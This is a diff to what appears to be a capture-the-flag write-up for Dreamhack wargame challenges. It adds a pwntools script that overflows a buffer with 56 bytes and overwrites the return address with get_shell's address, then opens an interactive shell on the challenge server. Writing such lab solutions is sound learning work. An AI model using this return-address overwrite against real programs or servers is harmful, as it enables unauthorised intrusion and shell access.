@@ -287,6 +287,18 @@ r.interactive()
 
 ![image](https://user-images.githubusercontent.com/111769169/227600958-9ec62751-4e4d-42a0-ad9f-0de489a80fb5.png)
 
+```python
+from pwn import *
+
+exe = ELF("./rao")
+# r = process(exe.path)
+r = remote("host3.dreamhack.games", 15236)
+
+payload = b"a" * 56 + p64(exe.sym['get_shell'])
+
+r.sendlineafter(b"Input: ", payload)
+r.interactive()
+```
 # basic_exploitation_003
 
 ## Source C
